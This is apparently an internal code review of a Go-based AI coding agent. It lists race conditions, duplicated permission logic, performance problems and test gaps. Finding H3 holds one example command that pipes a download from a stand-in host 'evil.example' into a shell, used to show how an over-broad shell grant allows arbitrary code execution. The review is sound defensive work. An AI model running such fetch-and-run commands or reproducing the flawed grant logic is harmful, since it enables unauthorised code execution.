# Codebase review — 2026-09-12

- **Scope:** entire codebase (`cmd/`, `internal/`, `integration/`, ~131 Go
  files, ~47k lines).
- **Mode:** specific-topic, one reviewer per topic: architecture, readability,
  correctness, performance, testing.
- **Verification:** findings were reviewed against the tree after the
  subagent/delegation/task-queue removal completed; line numbers were
  re-verified against the current working tree (which builds and passes
  `go vet`). The H1 race was re-reproduced on the current tree with the probe
  described below.

## High

### H1. Data race: turn goroutine reads `session.state` unlocked while setters rewrite it (correctness, testing; architecture flagged the same suspicion)

`internal/agent/loop.go:1680-1702` (`publishUsage` reads `value.state.cost` and
`value.state.turnConfiguration()` with no lock) and unlocked reads of
`value.state.usage`/`.cwd` at `loop.go:119,162,253,267,345,474` and
`agent.go:1448`, racing `commitLocked`'s `value.state = next` under `stateMu`
(`internal/agent/agent.go:1230`). A `session/set_config_option` commits while a
turn streams (the server runs requests concurrently, `cmd/ox/main.go`),
violating `docs/spec.md` ("Concurrent setters are serialized in accepted order")
and tearing multiword struct reads for a live turn.

Evidence: an untracked probe test, `internal/agent/zz_review_race_test.go`,
hammers `publishUsage` concurrently with `commit(recordUserMessage)` on one
session and fails under `-race` on the current tree (race detected: write
`commitLocked` vs read `loop.go:1680`). A full `go test -race -count=1 ./...`
run during the review failed `integration` with this same race; three post-hoc
reruns of the shipped suite passed — the gate catches it only intermittently.
`compactionUsageEvent` (`internal/agent/compact.go`) already reads the same
fields under `stateMu`; the fix is to take `stateMu` in `publishUsage` and the
other turn-goroutine reads, or capture an immutable config/usage snapshot at
turn admission. Commit the probe as a named regression test (and remove the
`zz_` temporary name) alongside the fix.

### H2. Permission-approval rule has two full implementations that have already drifted (architecture, readability)

`internal/agent/loop.go:773-1007` (`executeSuspendedBatch`, durable path) and
`loop.go:1033-1210` (`executeBatchWith`, live path) each implement the same
rule: tool lookup, bypass check, rule suggestion, permission request,
`decideApproval`, cancellation handling, allow-always downgrade, grant,
batch-cancel bookkeeping. The decision switch appears twice in the suspended
path (`loop.go:825-835`, `937-947`) and once in the live path. The copies
already diverge: the live path logs when an allow-always has no derivable rule
(`loop.go:1139`); the suspended path downgrades silently (`loop.go:926`), and
the live path has a pre-ask cancellation branch (`loop.go:1083`) the suspended
path lacks. Permission enforcement is the security-relevant rule
`eng/architecture.md` names explicitly; it currently lives in two owners.

Fix: one approval routine parameterized by the durable pending-permission step
(a `persist`/`reissue` argument), with the decision switch extracted once (e.g.
a `toolResult.applyDecision` helper). Durable pending-permission state stays
owned by the suspended-exchange records in `state.go`.

### H3. Reusable shell grant can degrade to a bare interpreter rule (correctness — security-relevant)

`internal/shellrules/shellrules.go:69-90`: `Suggest` returns `words[0]` when the
second word is a flag (`shellrules.go:86-89`), and `Allowed`
(`shellrules.go:14-66`) matches only the rule prefix, leaving remaining
arguments unchecked. Proven trace: allow-always on `sh -c $SCRIPT` derives the
rule `"sh"`, after which
`Allowed(["sh"], "sh -c 'curl evil.example | sh'") == true` — arbitrary code
execution granted for the rest of the session. Same for `bash -c`, `env`, any
`x -flag …`. This contradicts `eng/architecture.md` ("Reusable shell grants are
derived from a parsed command rather than string prefixes").

Fix: when any argument beyond the matched prefix is non-literal, or the derived
rule would be a bare interpreter name, suggest nothing (allow-once only).

### H4. Checkpoint-per-boundary makes the session log grow O(turns × history) with a hard unload threshold (performance)

`internal/agent/agent.go:1213-1224` writes a full-state checkpoint at
`recordTurnFinished` and `recordCompaction`. Each checkpoint serializes the
entire session state (easily 100 KB–1 MB) to JSON, decodes it again
(`restoreCheckpoint`, `internal/agent/state.go:509`), and fsyncs
(`internal/agent/store.go:256`). The JSONL only ever grows; past the 64 MB
`readRecords` cap (`internal/agent/store.go:275-277`) the session can no longer
be opened, with no repair path. The growth is per turn, so an aged session with
long history accumulates one full-state copy per completed turn.

Fix direction: rewrite/truncate the log at the checkpoint so the file is bounded
by one snapshot plus the tail, removing both the quadratic growth and the unload
threshold. A soak test driving N turns with realistic history sizes would
confirm the growth rate.

## Medium

### Correctness

**M1. `read_file` inline output is unbounded for single-line files.**
`internal/tools/read.go:111-141`: `window()` applies the byte bound only when
`end > start`, so the first line is included whole; `workspace.ReadFile`
(`internal/workspace/workspace.go:96`) also reads the entire file. Proven: a 3
MiB single-line file returned 3,145,728 bytes inline against a 51,200-byte
`InlineMaxBytes`; a larger line then exceeds the 8 MiB record cap
(`internal/agent/store.go:19`) and poisons session persistence. Fix: cap the
first line too and elide with a footer. (Performance independently flagged the
whole-file read as perf-L8.)

**M2. Multimodal prompts are advertised and accepted but every image/audio turn
is refused.** Capabilities claim `Image: true, Audio: true`
(`internal/agent/agent.go:212-213`) and `acp` validates image/audio blocks
(`internal/acp/validate.go:373-413`), but `estimateProviderRequest` rejects any
request containing them unconditionally (`internal/agent/compact.go:320-326`),
so admission fails. Contract drift against `docs/spec.md` ("Estimates include
the pending prompt, instructions, tool schemas, and multimodal content"). Fix:
estimate multimodal content (a conservative byte bound fits the house style) or
stop advertising it and record the omission in the spec.

### Architecture

**M3. `internal/lsp` is a 1,342-line production subsystem with zero callers, and
the documents disagree about it.** Nothing imports it (verified by grep and
`go list -deps`); its integration plan
(`eng/plans/2026-09-05-004-lsp-session-integration.md`) is unimplemented and
unscheduled. `eng/architecture.md:67-68,114,124,128` gives it owned
responsibilities and declares `agent -> lsp` and `tools -> lsp` edges that do
not exist; AGENTS.md's codebase map omits the package. Fix: implement the
integration slice or remove the adapter, and make the architecture diagram and
AGENTS.md map match the code.

**M4. ACP input validation is duplicated at three owners.**
`acp.NewSessionRequest.Validate` (`internal/acp/validate.go:236-245`),
`Agent.validateActivation` (`internal/agent/agent.go:882-898`), and
`mcp.Activate` (`internal/mcp/mcp.go:89`) each re-validate MCP server config and
additional directories. `internal/acp` owns client-input validation per
`eng/architecture.md`; only the `requireMCP` re-check is justified
(ResumeSession legitimately allows nil). Fix: keep validation in `acp`; drop the
redundant checks.

**M5. The confined-regular-file read pattern is implemented three times.**
`internal/workspace/platform.go:11-26`, `internal/skills/skills.go:231-267`
(`readBoundedRegular`), and `internal/agent/prompt.go:102-178`
(`loadRootInstructions`) are near-verbatim copies (Lstat, symlink reject,
`O_NONBLOCK` open, re-Stat, bounded UTF-8 read), including a duplicated comment
about the FIFO-hang rationale. Confinement is the project's most safety-critical
pattern; it should have one home. Fix: a bounded confined-read helper on
`Workspace` (or one shared helper) used by all three.

**M6. The catalog-cache path is resolved from the environment inside the
provider package.** `internal/openrouter/cache.go:19-24` reads
`XDG_CACHE_HOME`/`HOME` at call time while `cmd/ox` supplies every other process
input via `agent.Config`. A configuration surface owned by a lower boundary and
invisible where the other paths are. Fix: resolve in `cmd/ox`/settings and pass
it through the client.

**M7. Production helpers kept alive only by tests.** `executeBatch`
(`internal/agent/loop.go:1009`), `estimateRequestTokens`
(`internal/agent/compact.go:458`), and the `beforeRename` field
(`internal/agent/memory.go:50,330-334`) have only test callers. AGENTS.md
forbids exposing internal state for test convenience; these also make tests
exercise a shape no production caller uses. Fix: test the real entry points;
inject the rename-failure seam through construction.

### Performance

**M8. Deep clone of the whole durable state on every record commit, with an
ever-growing records slice.** `value.state.clone()` per commit
(`internal/agent/agent.go:1200` → `internal/agent/state.go` `clone`) copies
`s.records`, which `foldRecords` retains for the session's life, making
cumulative commit cost quadratic in session age; each commit also
JSON-round-trips the resolved settings and, when suspended, the whole exchange.
Fix direction: copy-on-write the records slice; reuse a frozen configuration
instead of re-cloning per commit.

**M9. Full-request JSON marshals repeated per model request.**
`providerRequestBytes` (`internal/agent/loop.go:1536`) marshals the whole
request for a trace byte count even when tracing is disabled (`loop.go:178`;
also `internal/agent/compact.go:110`), the client marshals it again
(`internal/openrouter/client.go:104`), and token admission re-marshals at five
call sites (`internal/agent/compact.go:97,153,174,240,263`). One redundant full
encode per request, permanently. Fix: lazy/gated byte count, measure inside the
client from the already-encoded body, and size the protected prefix and tail
from one serialization.

**M10. `session/list` reads and folds every session's complete log on every
call.** `internal/agent/store.go:124` folds all records per file before
pagination (`internal/agent/agent.go:767-795`); latency scales with total stored
history, not the 50-item page. Fix: a small sidecar index written at commit
time, or stop before `foldRecords` — the listed fields are all
checkpoint-projection fields.

**M11. Every MCP tool call performs a full tool re-discovery round trip.**
`internal/mcp/mcp.go:143` walks `ListTools` pagination and re-parses schemas
(`discoverTools`, `mcp.go:244`) before each call, roughly doubling latency for
fast tools. Fix: cached catalog with cheaper revalidation.

### Readability

**M12. The suspended parameter is loop-carried state in `runFrom`.**
`internal/agent/loop.go:95-110`: the `suspended` parameter is read as resume
data on entry, reassigned mid-loop when the first tool-call response creates the
suspension, and re-enters its own entry branch on the next iteration;
`reissue bool` is similarly mutated and passed positionally. Assign both to
locals at the top so the loop reads as "pending is the exchange whose tool batch
is in flight."

**M13. The `session` struct's seven mutexes name no guard.**
`internal/agent/agent.go:1682-1701`: `stateMu`, `configMu`, `mu`, `approvalMu`,
`exclusiveMu`, `callIDsMu`, `readScopesMu` guard overlapping fields; `callIDsMu`
and `stateMu` are always taken together (`loop.go:436-439,471-483`) but the
invariant is stated nowhere. One comment per mutex naming what it guards.

**M14. Invisible lock invariant in `Prompt`.**
`internal/agent/agent.go:1388-1398`: `configMu` is taken around the user-message
commit to exclude `SetSessionConfigOption` (`config_options.go` holds the same
pair); nothing says why. One sentence at the lock.

**M15. One concept, two spellings: `sessionUpdate` values.** Constants exist
(`internal/acp/types.go:611-615`) but `adapter.go:61-180` and
`state.go:1529-1568` are mostly string literals, sometimes mixed with constants
two lines apart (`adapter.go:130` vs `135`, `state.go:1529` vs `1538`). Add the
missing constants and use them everywhere.

**M16. Approval gating uses positional mystery bools.**
`activateSession(..., true, true)` vs `(..., false, false)` at
`agent.go:398,572` (definition `agent.go:588`) are unreadable at the call site.
Named wrappers or an options struct.

**M17. Error classification by message substring.**
`internal/openrouter/client.go:143-146` sniffs `"read OpenRouter stream"` prose
(produced at `internal/openrouter/sse.go:47`) instead of using a sentinel like
the `errStreamEnded` check two lines above. A message refactor silently changes
retry behavior.

**M18. `recordModelExchange` validation is one long inline case.**
`internal/agent/state.go:970-1049` validates the completed exchange against its
suspension and appends assistant and tool messages in a single ~80-line case;
the per-call validation block is a named helper waiting to happen.

### Testing

**M19. `session/list` cursor pagination is completely untested.**
`internal/agent/agent.go:767-823`: page size 50, cursor round trip
(`NextCursor`, `agent.go:794`), stale/mismatched cursor errors — no test touches
`NextCursor`. Add an integration test with 50+ sessions asserting page
boundaries and stale-cursor errors, or a unit test on the cursor codec plus one
e2e proof.

**M20. Wall-clock sleep in `TestClientRetriesRetryAfterAndSucceeds`.**
`internal/openrouter/client_test.go:149-178` waits a real 2s `Retry-After` and
asserts elapsed time in a window — flaky on loaded CI and against the no-sleeps
rule. The sibling tests already inject `client.retryWait`; assert the parsed
delay instead.

## Low

**Correctness / durability**

- L1. `Manager.Close` can leak a language server started concurrently —
  `internal/lsp/lsp.go:360-372` scans `state.client` without coordinating with
  an in-flight `serverState.get`; `startClient`'s context is the caller's, not
  the manager's.
- L2. `atomicReplace` uses a deterministic temp name (`<name>.ox-tmp`, `O_EXCL`)
  — `internal/workspace/workspace.go:304`. A crash between create and rename
  permanently blocks writes to that file; two sessions on one canonical cwd
  collide.
- L3. Nondeterministic diagnostic ordering — `internal/lsp/protocol.go:401`
  iterates a map.

**Architecture**

- L4. Empty stale directory `internal/config/` — delete it.
- L5. Restated rules: 32-hex ID validation (`internal/agent/store.go:312` vs
  `internal/tools/memory.go:186`), loopback-host check
  (`internal/acp/mcp.go:185` vs `internal/mcp/transport.go:160`), directory-sync
  helper (`internal/agent/lock.go:7-16` vs
  `internal/workspace/platform.go:28-36`), memory limits restated
  (`internal/tools/memory.go` vs `internal/agent/memory.go`).
- L6. `session.claim` / `claimRecovery` duplicate the release closure verbatim
  (`agent.go:1735` vs its recovery twin); extract `beginTurn` with an admission
  predicate.
- L7. Package-level mutable test seam in production code:
  `defaultWebFetchNetwork` (`internal/tools/web_fetch.go:54`), written only from
  the build-tagged `web_fetch_oxe2e.go` init. Pass the network through the
  existing parameter instead.

**Performance**

- L8. `read_file` materializes and splits the whole file for a 200-line window
  (`internal/workspace/workspace.go:78-101`, `internal/tools/read.go:111-176`).
- L9. Checkpoint restore clones full state once per pending tool execution
  (`state.go:728-741`).
- L10. Config options deep-clone the entire model catalog per activation and per
  change (`internal/agent/config_options.go:116-121,187-194,310-325`).
- L11. LSP client writes each message in two unbuffered syscalls
  (`internal/lsp/client.go:294-311`).
- L12. Glob pattern re-parsed per walked file (`internal/tools/glob.go:85`).

**Readability**

- L13. Dead binding in `Prompt`: `userMessage, err := promptMessage(...)` then
  `_ = userMessage` (`agent.go:1337-1341`). Write
  `if _, err := promptMessage(...); err != nil`.
- L14. Turn-event plumbing duplicated in `Prompt` and `recoverSession`
  (`agent.go:1380-1470` region vs `agent.go:463-530` region): channels,
  goroutine, event pump, first-error-wins, ticker flush, release, cancellation
  mapping — near-verbatim; extract a relay helper.
- L15. `isLocalHost` lives twice under two names (`internal/acp/mcp.go:185` vs
  `internal/mcp/transport.go:160`); the `mcp` copy already imports `acp`.
- L16. `estimateRequestTokens` has no production caller (`compact.go:458`) — see
  M7.
- L17. `discoveredTool` is a one-field wrapper adding a hop
  (`internal/mcp/mcp.go:80`).
- L18. `toolTitle` names two different things: method `agent`/`loop.go:1621` and
  free function `loop.go:1632` (plus `toolSetTitle`, `loop.go:1625`). Keep one
  and inline the other.
- L19. `recordCompaction` re-implements `applyCompaction` inline
  (`state.go:798-810` vs `1152`).
- L20. `sameRequestConfiguration` mutates its arguments inside a comparison
  predicate (`state.go:1928`).
- L21. Inconsistent marshaling style inside one `switch`
  (`internal/acp/types.go:493-547`).
- L22. Catalog byte accounting implemented twice (`internal/mcp/mcp.go:97-126`
  vs `249-283`).
- L23. Error juggling in `readCredential` reads backwards
  (`cmd/ox/login.go:86-89`).
- L24. LSP `Manager` methods repeat a five-step preamble
  (`internal/lsp/lsp.go:251-357`).
- L25. `panic(err)` on provably-impossible paths without a why-comment
  (`agent.go` `toolsWithoutForm`, `config_options.go` `constrainedToolSet`).

**Testing**

- L26. `workspace.Edit`'s post-rename sync-failure path is untested
  (`internal/workspace/workspace.go:197-204`); mirror the existing `WriteFile`
  proof using the `syncDir` stub.
- L27. MCP protocol-revision mismatch untested (`internal/mcp/mcp.go:228-234`).
- L28. `mcp.Bundle.Call` argument errors untested
  (`internal/mcp/mcp.go:146,152`).
- L29. Trace span bookkeeping weakly asserted: `internal/trace/trace.go:173-201`
  has no unit test and the e2e check only asserts `elapsed_ms >= 0`
  (`internal/e2e/trace_test.go:109`); a regression reporting 0 passes.
- L30. Integration harness quiescence is a 25ms wall-clock heuristic
  (`integration/agent_loop_test.go:4950-4965`); prefer a deterministic
  end-of-turn signal.

## Unresolved suspicions

1. **`publishUsage` lock discipline** — settled as a real race by two lenses
   (H1), but the exhaustive enumeration of unlocked `value.state` reads in the
   turn goroutine should be completed when H1 is fixed.
2. **`executeSuspendedBatch` retry on `!recorded`** (`loop.go:921-925`)
   decrements the index and re-asks; no reachable path could be constructed. A
   fault-injection test on `commitPermissionDecision` would settle whether it
   can spin or double-prompt.
3. **`session/list` fails entirely if any one session log is corrupt**
   (`store.go:124-163`). Conservative; confirm whether one corrupt session
   should fail the listing.
4. **LSP integration intent** — is the unused `internal/lsp` parked pending a
   todo list slice, or dead? (M3.)
5. **Session-log growth and `session/list` latency at scale** (H4, M10) — settle
   with a soak test over aged session stores.
6. **jrpc2 per-delta notification cost** (`agent.go:181-188` → `adapter.send`) —
   measurement-first; the streaming contract likely requires per-chunk delivery.
7. **`callIDsMu`+`stateMu` lock-order uniformity** — spot-checked at
   `loop.go:436-439,471-483`; an exhaustive proof belongs with H1's fix.
8. **`reissue` flag lifecycle across recovery paths** — traced as "re-present an
   open permission once after a load," but a runtime trace across load/recovery
   should confirm the two batch functions agree on when it resets.

## Checks run

- `go build ./...`, `go vet ./...` — clean on the current tree.
- H1 re-verified on the current tree: the untracked probe
  `internal/agent/zz_review_race_test.go` fails under
  `go test -race -count=1 -run TestReviewRacePublishUsageVsCommit ./internal/agent`
  with the race (write `commitLocked` vs read `publishUsage`).
- `go test -race -count=1 ./...` — one full run failed `integration` with the H1
  data race; three reruns of `./integration` passed (intermittent). All other
  packages passed, including `internal/e2e` (187s).
- staticcheck — local binary incompatible with the toolchain;
  `staticcheck@latest` run from source against the reviewed tree: clean.
- Full import-graph extraction (`go list -deps`) compared edge-by-edge against
  `eng/architecture.md`.
- Targeted reproductions in a scratch copy: H1 race under `-race`; H3 grant
  widening (`sh -c` → rule `"sh"`); M1 read-bound bypass (3 MiB inline vs 50 KiB
  limit).
- Micro-benchmark (scratch, Apple M4): `StreamRecorder.sanitize` at 20,992 ns/op
  / 98,304 B/op for a 32 KB chunk vs 2.79 ns/op / 0 allocs for a
  validity-checked fast path.
- Post-refactor re-verification pass: every surviving finding's anchor
  re-checked against the current tree (grep for each cited symbol);
  delegation/subagent-queue findings removed as no longer present.
- Greps: env reads, `func init()`, package-level vars, dead-symbol caller
  checks, sessionUpdate literal vs constant usage, history-style comments (none
  in production code), cursor/sleep/span test coverage.

## Verdicts

- **Architecture:** the dependency graph is clean and state ownership is real,
  but the permission rule (H2) and the confinement read pattern (M5) each have
  two or three owners, `internal/lsp` is dead weight with contradictory
  documentation (M3), and validation is split across three owners (M4).
- **Readability:** the codebase reads well (guard clauses, why-comments,
  consistent receivers); the exceptions are the duplicated approval machinery,
  undocumented lock invariants, and mystery positional bools.
- **Correctness:** one confirmed race (H1), one unbounded tool-output path (M1),
  one over-broad permission rule (H3), and one advertised-but-refused capability
  (M2); the rest of the traced paths held against the owning documents.
- **Performance:** dominated by durable-state growth and repeated full-request
  encodes (H4, M8-M11); per-byte streaming paths are fine except
  `StreamRecorder.sanitize` (measured).
- **Testing:** coverage is thorough and at the right boundaries; the gaps are
  the intermittently-caught race, cursor pagination, and a handful of narrow
  error paths.
